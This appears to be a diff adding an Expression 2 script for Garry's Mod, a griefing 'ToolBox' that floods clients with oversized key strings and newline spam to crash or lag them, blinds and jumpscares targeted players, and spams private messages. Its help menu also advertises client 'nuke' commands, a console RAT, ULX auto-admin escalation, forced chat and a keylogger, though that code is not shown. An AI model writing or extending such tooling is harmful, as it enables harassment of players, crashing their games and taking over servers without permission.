@@ -1,0 +1,200 @@
+@name TB_Conf_v1_2
+@inputs 
+@outputs 
+@persist [Holos, Count, I, Run]:number TargPly:entity [Target, KTarget, ChatStr]:string
+@strict
+
+function ps(PN:string, Msg:string){
+    NStr = ""
+    
+    foreach(C, Char:string = Msg){
+        if(Char != "~"){
+            NStr += Char            
+        }
+        else{
+            NStr += " "
+        }
+        
+        Msg = NStr
+    }
+    
+    ARG = (PN + " " + Msg)
+    concmd("ulx psay " + PN + " " + Msg)
+}
+
+function cancer(){
+    KeyString = ""
+    
+    if(first()){
+        runOnTick(1)
+    }
+    
+    KeyString = "abcd"
+    for (I=1,500) {
+        KeyString += "abcd"
+    }
+    
+    for(I=1,500){
+       #pacSetKeyValue(owner(), KeyString,KeyString,1500)
+    }
+    
+    if(!getTimers():count() > 0){
+        timer("yes",500)
+    }
+}
+
+function chatcrash(){
+    X = 255
+    Str = "\n":repeat(X)
+    #chatPrint(entity(), Str)
+}
+
+function blind(TargName:string, Run:number){
+    
+    if(TargName != "*"){
+    
+        Targ = findPlayerByName(TargName)
+        Bl = 1
+        
+        if(Run == 0){
+            holoAlpha(Bl, 0)
+        }
+        
+        else{
+            holoModelAny()
+            holoCreate(Bl)
+            Blinder = holoEntity(Bl)
+            holoMaterial(Bl, "debug/debugportals")
+            holoParent(Bl, Targ)
+            holoModel(Bl, "sphere")
+            holoScale(Bl, vec(-30))
+            holoVisible(Bl, Targ, 1)
+            holoAlpha(Bl, 255)
+            
+            print("\n[TB]: Blinding " + TargName + " . . .")
+            holoPos(Bl, Targ:pos() + vec(0,0,50))
+            holoColor(Bl, vec(0,0,0))
+            
+            for(I=1, 100, 1){
+                #Blinder:emitSound("Town.d1_town_02a_fz_scream1")
+                
+                if(Run == 0){
+                    I = 100
+                }
+                else{
+                    I -= 1
+                }
+            }
+        }
+    }
+    
+    else{
+        foreach(P, Ply:entity = players()){
+            holoModelAny()
+            holoCreate(P)
+            Blinder = holoEntity(P)
+            holoMaterial(P, "debug/debugportals")
+            holoParent(P, Ply)
+            holoModel(P, "sphere")
+            holoScale(P, vec(-30))
+            holoVisible(P, Ply, 1)
+            holoAlpha(P, 255)
+            holoPos(P, Ply:pos() + vec(0,0,50))
+            holoColor(P, vec(0,0,0))
+            
+            for(I=1, 100, 1){
+                #Blinder:emitSound("Town.d1_town_02a_fz_scream1")
+                
+                if(Run == 0){
+                    I = 100
+                }
+                else{
+                    I -= 1
+                }
+            }
+        }
+    }
+}
+
+function jump(TargName:string){
+    
+    if(TargName != "*"){
+        Targ = findPlayerByName(TargName)
+        J = 1
+        
+        holoCreate(J)
+        holoAlpha(J, 0)
+        holoParent(J, Targ)
+        Jmp = holoEntity(J)
+        
+        while(1 & perf(100)){
+            holoPos(J, Targ:pos())
+            #Jmp:emitSound("Town.d1_town_02a_fz_scream1")
+        }
+    }
+    
+    else{
+        foreach(P, Ply:entity = players()){
+            holoCreate(P)
+            holoAlpha(P, 0)
+            holoParent(P, Targ)
+            Jmp = holoEntity(P)
+            
+            while(1 & perf(100)){
+                #Jmp:emitSound("Town.d1_town_02a_fz_scream1")
+            }
+        }
+    }
+}
+
+function mute(Run:number){
+    Fun = ""
+    if(Run == 1){
+        print("\n[TB]: Muting chat . . . ")
+        for(X=1, 10*Run, 1){
+            Fun += "\n":repeat(X)
+            
+            modifyChat(Fun)
+            X++
+            
+            if(Run == 0){
+                break
+            }
+        }
+    }
+    else{
+        print("\n[TB]: Chat unmuted.")
+        X = 0
+        Fun = ""
+    }
+}
+
+function tbhelp(){
+    Header = "\n***[ToolBox v1.2 Commands]***\n"
+    
+    Body = "            - _help, _h | Displays this menu.
+            - _bl {plyname:string} {toggle:number} | Blinds target player.
+            - _jump {plyname:string} | Jumpscares target player."
+    
+    Body2 = "            - _ps {plyname:string} {msg:string} {toggle:number} | Psay spam.
+            - _1tap | Nukes all clients.
+            - _2tap | Nukes all clients (uses chatPrint)."
+    
+    Body3 = "            - _tbx_run {arg} | [BETA] E2 console RAT.
+            - _tbx_run aids | [BETA] ULX auto-admin.
+            - _tbx_run_say {msg:string} |[BETA] Forces RAT victim to\n              send chat message."
+    
+    Body4= "            - _tbx_keylog {target:string} | Keylogger. Prints to console."
+    
+    Footer = "\n***[Additional Features]***\n"
+    Foot1 = "            - R to start frame lag.
+           - T to stop frame lag.\n\n(!) SEE TOP OF OUTPUT (!)\n"
+    
+    print(Header)
+    print(Body)
+    print(Body2)
+    print(Body3)
+    print(Body4)
+    print(Footer)
+    print(Foot1)
+}
